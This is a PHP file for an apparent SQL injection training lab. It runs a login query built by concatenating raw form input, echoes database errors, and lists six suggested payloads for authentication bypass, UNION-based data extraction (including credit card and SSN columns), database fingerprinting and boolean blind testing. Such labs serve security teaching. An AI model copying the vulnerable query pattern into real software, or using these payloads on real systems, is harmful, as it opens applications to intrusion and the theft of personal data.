<?php
include 'config.php';

// Set error reporting untuk debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Test koneksi database
if ($conn->connect_error) {
    die("Database connection failed: " . $conn->connect_error);
}

// Test query sederhana
echo "<h2>🧪 SQL Injection Testing Page</h2>";
echo "<p>This page is for testing SQL injection payloads manually.</p>";

if ($_POST) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    echo "<h3>Input Received:</h3>";
    echo "<p><strong>Username:</strong> " . htmlspecialchars($username) . "</p>";
    echo "<p><strong>Password:</strong> " . htmlspecialchars($password) . "</p>";

    // Build vulnerable query
    $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";

    echo "<h3>Query to Execute:</h3>";
    echo "<pre style='background: #f4f4f4; padding: 10px; border-radius: 5px;'>$query</pre>";

    try {
        $result = $conn->query($query);

        if ($result === false) {
            echo "<div style='color: red; background: #ffe6e6; padding: 10px; border-radius: 5px;'>";
            echo "<h3>❌ SQL Error:</h3>";
            echo "<p>" . $conn->error . "</p>";
            echo "</div>";
        } else {
            if ($result->num_rows > 0) {
                echo "<div style='color: green; background: #e6ffe6; padding: 10px; border-radius: 5px;'>";
                echo "<h3>✅ Query Successful!</h3>";
                echo "<p>Rows found: " . $result->num_rows . "</p>";

                echo "<table border='1' style='border-collapse: collapse; margin-top: 10px;'>";
                echo "<tr><th>ID</th><th>Username</th><th>Email</th><th>Role</th></tr>";

                while ($row = $result->fetch_assoc()) {
                    echo "<tr>";
                    echo "<td>" . htmlspecialchars($row["id"]) . "</td>";
                    echo "<td>" . htmlspecialchars($row["username"]) . "</td>";
                    echo "<td>" . htmlspecialchars($row["email"]) . "</td>";
                    echo "<td>" . htmlspecialchars($row["role"]) . "</td>";
                    echo "</tr>";
                }
                echo "</table>";
                echo "</div>";
            } else {
                echo "<div style='color: orange; background: #fff3cd; padding: 10px; border-radius: 5px;'>";
                echo "<h3>⚠️ No Results</h3>";
                echo "<p>Query executed successfully but no rows returned.</p>";
                echo "</div>";
            }
        }
    } catch (Exception $e) {
        echo "<div style='color: red; background: #ffe6e6; padding: 10px; border-radius: 5px;'>";
        echo "<h3>❌ Exception:</h3>";
        echo "<p>" . $e->getMessage() . "</p>";
        echo "</div>";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>SQL Injection Test Lab</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 900px; margin: 20px auto; padding: 20px; }
        .payload-box { background: #f8f9fa; border: 1px solid #dee2e6; padding: 15px; margin: 10px 0; border-radius: 5px; }
        .payload { font-family: monospace; background: #e9ecef; padding: 8px; border-radius: 3px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 8px; margin: 5px 0; }
        button { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; }
    </style>
</head>
<body>

<form method="POST">
    <h3>Test Form:</h3>
    <label>Username:</label>
    <input type="text" name="username" value="<?php echo htmlspecialchars($_POST['username'] ?? ''); ?>">
    
    <label>Password:</label>
    <input type="password" name="password" value="">
    
    <button type="submit">Test Query</button>
</form>

<h3>🎯 Recommended Test Payloads:</h3>

<div class="payload-box">
    <h4>1. Basic Authentication Bypass:</h4>
    <div class="payload">admin' OR 1=1 #</div>
    <p>Use # for MySQL comments instead of --</p>
</div>

<div class="payload-box">
    <h4>2. Alternative Comment Syntax:</h4>
    <div class="payload">admin' OR '1'='1' /*</div>
    <p>Use /* for block comments</p>
</div>

<div class="payload-box">
    <h4>3. Union-based Injection:</h4>
    <div class="payload">admin' UNION SELECT 1,2,3,4 #</div>
    <p>Extract data from other columns</p>
</div>

<div class="payload-box">
    <h4>4. Information Gathering:</h4>
    <div class="payload">admin' UNION SELECT 1,database(),user(),version() #</div>
    <p>Get database information</p>
</div>

<div class="payload-box">
    <h4>5. Data Extraction:</h4>
    <div class="payload">admin' UNION SELECT id,secret_info,credit_card,ssn FROM sensitive_data #</div>
    <p>Extract sensitive data</p>
</div>

<div class="payload-box">
    <h4>6. Boolean-based Test:</h4>
    <div class="payload">admin' AND 1=1 #</div>
    <div class="payload">admin' AND 1=2 #</div>
    <p>Compare the results to detect boolean-based blind SQLi</p>
</div>

<p><a href="index.php">← Back to Main App</a> | <a href="search.php">Search Page →</a></p>

</body>
</html>
